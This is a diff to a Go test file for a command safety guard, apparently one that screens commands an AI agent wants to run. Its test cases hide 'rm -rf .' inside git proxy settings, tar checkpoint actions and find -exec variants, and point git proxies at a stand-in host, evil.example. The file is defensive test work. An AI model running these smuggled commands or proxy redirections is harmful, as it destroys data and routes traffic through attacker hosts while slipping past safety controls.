@@ -255,6 +255,21 @@ func TestGuardScansCommandExecutionIndirection(t *testing.T) {
 			safety.DecisionDeny, "dangerous.rm_rf",
 		},
 		{
+			"git proxy command", safety.Request{Command: `git -c core.gitProxy='rm -rf .' status`},
+			safety.DecisionDeny, "dangerous.rm_rf",
+		},
+		{
+			"git attached proxy command", safety.Request{Command: `git -ccore.gitProxy='rm -rf .' status`},
+			safety.DecisionDeny, "dangerous.rm_rf",
+		},
+		{
+			"git config env proxy command", safety.Request{
+				Command: `git --config-env=core.gitProxy=LANG status`,
+				Env:     map[string]string{"LANG": "rm -rf ."},
+			},
+			safety.DecisionDeny, "dangerous.rm_rf",
+		},
+		{
 			"tar checkpoint exec", safety.Request{Command: `tar --checkpoint=1 --checkpoint-action=exec='rm -rf .' -cf out.tar .`},
 			safety.DecisionDeny, "dangerous.rm_rf",
 		},
@@ -287,12 +302,127 @@ func TestGuardScansCommandExecutionIndirection(t *testing.T) {
 			safety.DecisionDeny, "dangerous.rm_rf",
 		},
 		{
+			"find exec", safety.Request{Command: `find . -exec rm -rf . \;`},
+			safety.DecisionDeny, "dangerous.rm_rf",
+		},
+		{
+			"find execdir", safety.Request{Command: `find . -execdir rm -rf . \;`},
+			safety.DecisionDeny, "dangerous.rm_rf",
+		},
+		{
+			"find ok", safety.Request{Command: `find . -ok rm -rf . \;`},
+			safety.DecisionDeny, "dangerous.rm_rf",
+		},
+		{
+			"find okdir", safety.Request{Command: `find . -okdir rm -rf . \;`},
+			safety.DecisionDeny, "dangerous.rm_rf",
+		},
+		{
+			"find recursively scans git", safety.Request{
+				Command: `find . -exec git -c core.gitProxy='rm -rf .' status \;`,
+			},
+			safety.DecisionDeny, "dangerous.rm_rf",
+		},
+		{
 			"benign git config", safety.Request{Command: `git -c user.name=agent status`},
 			safety.DecisionAllow, "safety.no_findings",
 		},
 		{
 			"benign difftool config", safety.Request{Command: `git -c difftool.prompt=false status`},
 			safety.DecisionAllow, "safety.no_findings",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			report := guard.Scan(tc.request)
+			require.Equal(t, tc.decision, report.Decision)
+			require.Equal(t, tc.rule, report.RuleID)
+		})
+	}
+}
+
+func TestGuardEnforcesCommandAllowlistInsideFindActions(t *testing.T) {
+	policy := safety.DefaultPolicy()
+	policy.AllowedCommands = []string{"find"}
+	report := mustGuard(t, policy).Scan(safety.Request{
+		Command: `find . -exec echo {} +`,
+	})
+	require.Equal(t, safety.DecisionDeny, report.Decision)
+	require.Equal(t, "dangerous.command", report.RuleID)
+}
+
+func TestGuardReviewsUnterminatedFindAction(t *testing.T) {
+	report := mustGuard(t, safety.DefaultPolicy()).Scan(safety.Request{
+		Command: `find . -exec echo {}`,
+	})
+	require.Equal(t, safety.DecisionNeedsHumanReview, report.Decision)
+	require.Equal(t, "command.indirect_execution", report.RuleID)
+}
+
+func TestGuardScansGitProxyConfigurations(t *testing.T) {
+	policy := safety.DefaultPolicy()
+	policy.NetworkAllowlist = []string{"github.com"}
+	policy.EnvAllowlist = append(policy.EnvAllowlist, "PROXY_URL")
+	guard := mustGuard(t, policy)
+	for _, tc := range []struct {
+		name     string
+		request  safety.Request
+		decision safety.Decision
+		rule     string
+	}{
+		{
+			"http proxy", safety.Request{
+				Command: `git -c http.proxy=https://evil.example clone https://api.github.com/x out`,
+			},
+			safety.DecisionDeny, "network.destination",
+		},
+		{
+			"attached http proxy", safety.Request{
+				Command: `git -chttp.proxy=https://evil.example clone https://api.github.com/x out`,
+			},
+			safety.DecisionDeny, "network.destination",
+		},
+		{
+			"scoped http proxy", safety.Request{
+				Command: `git -c http.https://api.github.com.proxy=https://evil.example status`,
+			},
+			safety.DecisionDeny, "network.destination",
+		},
+		{
+			"remote proxy", safety.Request{
+				Command: `git -c remote.origin.proxy=evil.example:443 fetch origin`,
+			},
+			safety.DecisionDeny, "network.destination",
+		},
+		{
+			"config env proxy", safety.Request{
+				Command: `git --config-env=http.proxy=PROXY_URL clone https://api.github.com/x out`,
+				Env:     map[string]string{"PROXY_URL": "https://evil.example"},
+			},
+			safety.DecisionDeny, "network.destination",
+		},
+		{
+			"unresolved config env proxy", safety.Request{
+				Command: `git --config-env=http.proxy=MISSING status`,
+			},
+			safety.DecisionNeedsHumanReview, "network.destination_unparsed",
+		},
+		{
+			"allowlisted proxy", safety.Request{
+				Command: `git -c http.proxy=https://api.github.com status`,
+			},
+			safety.DecisionAllow, "safety.no_findings",
+		},
+		{
+			"disabled remote proxy", safety.Request{
+				Command: `git -c remote.origin.proxy=none status`,
+			},
+			safety.DecisionAllow, "safety.no_findings",
+		},
+		{
+			"ambiguous http proxy", safety.Request{
+				Command: `git -c http.proxy=none status`,
+			},
+			safety.DecisionDeny, "network.destination",
 		},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
